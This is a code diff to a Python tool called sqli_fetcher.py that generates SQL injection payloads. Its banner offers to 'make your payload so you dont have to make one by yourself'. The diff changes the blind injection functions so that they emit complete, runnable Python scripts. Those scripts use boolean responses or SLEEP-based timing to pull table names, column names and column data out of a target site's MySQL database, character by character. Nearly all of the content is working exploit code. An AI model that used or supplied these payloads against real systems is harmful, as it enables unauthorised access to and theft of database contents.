@@ -18,7 +18,7 @@ def banner():
     print("made by: DJumanto")
     print("We make your payload so you dont have to make one by yourself")
 
-
+# TODO: Make it interactive
 def menu():
     print("\n\nUsage: python3 sqli_fetcher.py <your payload> <options>")
     print("-m <method> : method to use")
@@ -37,6 +37,7 @@ def generate_random_string():
     return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=10))
 
 # Return information in bound with returned response
+# TODO: MAKE FOR MORE DBMS
 def return_tables(payload, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
     sqlpayload = f'''{payload} UNION SELECT table_name,{f"'{keystring}',"*colcount} FROM information_schema.tables WHERE table_schema=database()-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
     if sub != []:
@@ -57,125 +58,168 @@ def return_data(payload, table, column, colcount, keystring=generate_random_stri
     return "Here's your payload sir: "+sqlpayload
 
 # return information in bound with limited/no response
-# TODO: MAKE BLIND CODE FOR USER
-# TODO: MAKE IT WORK AHAHAH
+# TODO: MAKE BLIND CODE FOR USER [DONE]
+# TODO: MAKE IT WORK AHAHAH 
+# TODO: MAKE FOR POST REQUEST
+# TODO: MAKE FOR MORE DBMS
 def return_tables_blind(url, payload, tablenamelike,  mode='bool',dbcontext="mysql"):
     if(mode == 'bool'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>{i},1,0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.status_code == 200:
-                i+=1
-            else:
-                break
-        tablename = ''
-        for j in range(i):
-            for s in string.ascii_lowercase:
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), {j}, 1)={s},1,0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.status_code == 200:
-                    tablename += s
-                    break
-        return tablename
-    if(mode == 'time'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>{i},SLEEP(4),0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.elapsed.total_seconds() > 3:
-                i+=1
-            else:
-                break
-        tablename = ''
-        for j in range(i):
-            for s in string.ascii_lowercase:
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), {j}, 1)={s},SLEEP(4),0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.elapsed.total_seconds() > 3:
-                    tablename += s
-                    break
-        return tablename
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+import string
 
-    
-    return
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>"""+"""{i}+,1,0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.status_code == 200:
+        i+=1
+    else:
+        break
+""" + f"""
+tablename = ''
+for j in range(i):
+    for s in string.ascii_lowercase:
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)={s},1,0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.status_code == 200:
+            tablename += s
+            break
+print(tablename)
+"""
+    if(mode == 'time'):
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+import string
+
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>"""+"""{i},SLEEP(4),0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.elapsed.total_seconds() > 3:
+        i+=1
+    else:
+        break
+""" + f"""
+tablename = ''
+for j in range(i):
+    for s in string.ascii_lowercase:
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.elapsed.total_seconds() > 3:
+            tablename += s
+            break
+print(tablename)
+"""
+
 def return_columns_blind(url, payload, table, mode="bool", dbcontext="mysql"):
     if(mode == 'bool'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},1,0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.status_code == 200:
-                i+=1
-            else:
-                break
-        columnname = ''
-        for j in range(i):
-            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},1,0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.status_code == 200:
-                    columnname += s
-                    break
-        return columnname
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>"""+"""{i},1,0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.status_code == 200:
+        i+=1
+    else:
+        break
+""" + f"""
+columnname = ''
+for j in range(i):
+    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)={s},1,0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.status_code == 200:
+            columnname += s
+            break
+print(columnname)
+"""
     if(mode == 'time'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>{i},SLEEP(4),0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.elapsed.total_seconds() > 3:
-                i+=1
-            else:
-                break
-        columnname = ''
-        for j in range(i):
-            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), {j}, 1)={s},SLEEP(4),0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.elapsed.total_seconds() > 3:
-                    columnname += s
-                    break
-        return columnname
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>"""+"""{i},SLEEP(4),0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.elapsed.total_seconds() > 3:
+        i+=1
+    else:
+        break
+""" + f"""
+columnname = ''
+for j in range(i):
+    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.elapsed.total_seconds() > 3:
+            columnname += s
+            break
+print(columnname)
+    """
 
     return
 def return_data_blind(url, payload, table, column, mode="bool", dbcontext="mysql"):
     if(mode == 'bool'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},1,0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.status_code == 200:
-                i+=1
-            else:
-                break
-        data = ''
-        for j in range(i):
-            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},1,0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.status_code == 200:
-                    data += s
-                    break
-        return data
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>"""+"""{i},1,0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.status_code == 200:
+        i+=1
+    else:
+        break
+""" + f"""
+data = ''
+for j in range(i):
+    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)={s},1,0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.status_code == 200:
+            data += s
+            break
+print(data)
+"""
     if(mode == 'time'):
-        i=1
-        while True:
-            sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>{i},SLEEP(4),0)-- -'''
-            response = requests.get(url+sqlpayload)
-            if response.elapsed.total_seconds() > 3:
-                i+=1
-            else:
-                break
-        data = ''
-        for j in range(i):
-            for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
-                sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), {j}, 1)={s},SLEEP(4),0)-- -'''
-                response = requests.get(url+sqlpayload)
-                if response.elapsed.total_seconds() > 3:
-                    data += s
-                    break
-        return data
-    return
+        return """
+Here's your code, you can adjust this for your convinience:\n""" + f"""
+import requests
+
+url = "{url}"
+i=1
+while True:
+    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>"""+"""{i},SLEEP(4),0)-- -'''
+    response = requests.get(url+sqlpayload)
+    if response.elapsed.total_seconds() > 3:
+        i+=1
+    else:
+        break
+""" + f"""
+data = ''
+for j in range(i):
+    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
+        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)={s},SLEEP(4),0)-- -'''
+        response = requests.get(url+sqlpayload)
+        if response.elapsed.total_seconds() > 3:
+            data += s
+            break
+print(data)
+"""
+
 
 if __name__ == '__main__':
     banner()
